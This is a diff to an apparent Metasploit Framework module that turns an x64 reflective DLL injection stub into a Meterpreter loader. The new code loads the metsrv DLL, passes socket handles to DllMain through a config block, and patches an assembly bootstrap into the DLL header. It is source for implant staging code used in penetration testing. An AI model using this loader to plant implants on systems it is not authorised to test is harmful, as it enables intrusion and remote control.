@@ -8,12 +8,12 @@ module Msf
 
 ###
 #
-# Common module stub for ARCH_X86_64 payloads that make use of Reflective DLL Injection.
+# Common module stub for ARCH_X86_64 payloads that make use of Meterpreter.
 #
 ###
 
 
-module Payload::Windows::ReflectiveDllInject_x64
+module Payload::Windows::MeterpreterLoader_x64
 
   include Msf::ReflectiveDLLLoader
   include Msf::Payload::Windows
@@ -22,7 +22,7 @@ module Payload::Windows::ReflectiveDllInject_x64
     super(update_info(info,
       'Name'          => 'Reflective DLL Injection',
       'Description'   => 'Inject a DLL via a reflective loader',
-      'Author'        => [ 'sf' ],
+      'Author'        => [ 'sf', 'OJ Reeves' ],
       'References'    => [
         [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ], # original
         [ 'URL', 'https://github.com/rapid7/ReflectiveDLLInjection' ] # customisations
@@ -32,12 +32,6 @@ module Payload::Windows::ReflectiveDllInject_x64
       'PayloadCompat' => { 'Convention' => 'sockrdi' },
       'Stage'         => { 'Payload'   => "" }
       ))
-
-    register_options( [ OptPath.new( 'DLL', [ true, "The local path to the Reflective DLL to upload" ] ), ], self.class )
-  end
-
-  def library_path
-    datastore['DLL']
   end
 
   def asm_invoke_dll(opts={})
@@ -55,29 +49,26 @@ module Payload::Windows::ReflectiveDllInject_x64
           ; add the offset to ReflectiveLoader()
           add rbx, #{"0x%.8x" % (opts[:rdi_offset] - 0x11)}
           call rbx              ; invoke ReflectiveLoader()
-        ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, socket)
+        ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config)
           ; offset from ReflectiveLoader() to the end of the DLL
-          mov r8, rdi           ; r8 contains the socket
+          add rbx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
+          mov [rbx], rdi        ; store the comms socket handle
+          mov [rbx+8], rsi      ; store the listen socket handle
+          mov r8, rbx           ; r8 points to the extension list
           mov rbx, rax          ; save DllMain for another call
           push 4                ; push up 4, indicate that we have attached
           pop rdx               ; pop 4 into rdx
-          call rbx              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, socket)
-        ; Invoke DllMain(hInstance, DLL_METASPLOIT_DETACH, exitfunk)
-          ; push the exitfunk value onto the stack
-          mov r8d, #{"0x%.8x" % Msf::Payload::Windows.exit_types[opts[:exitfunk]]}
-          push 5                ; push 5, indicate that we have detached
-          pop rdx               ; pop 5 into rdx
-          call rbx              ; call DllMain(hInstance, DLL_METASPLOIT_DETACH, exitfunk)
+          call rbx              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config)
     ^
   end
 
-  def stage_payload
+  def stage_meterpreter
     # Exceptions will be thrown by the mixin if there are issues.
-    dll, offset = load_rdi_dll(library_path)
+    dll, offset = load_rdi_dll(MeterpreterBinaries.path('metsrv', 'x64.dll'))
 
     asm_opts = {
       :rdi_offset => offset,
-      :exitfunk   => 'thread'     # default to 'thread' for migration
+      :length     => dll.length
     }
 
     asm = asm_invoke_dll(asm_opts)
@@ -87,17 +78,18 @@ module Payload::Windows::ReflectiveDllInject_x64
 
     # sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry
     if( bootstrap.length > 62 )
-      print_error( "Reflective Dll Injection (x64) generated an oversized bootstrap!" )
+      print_error( "Meterpreter loader (x64) generated an oversized bootstrap!" )
       return
     end
 
     # patch the bootstrap code into the dll's DOS header...
     dll[ 0, bootstrap.length ] = bootstrap
 
-    dll
+    return dll
   end
 
 end
 
 end
+
 
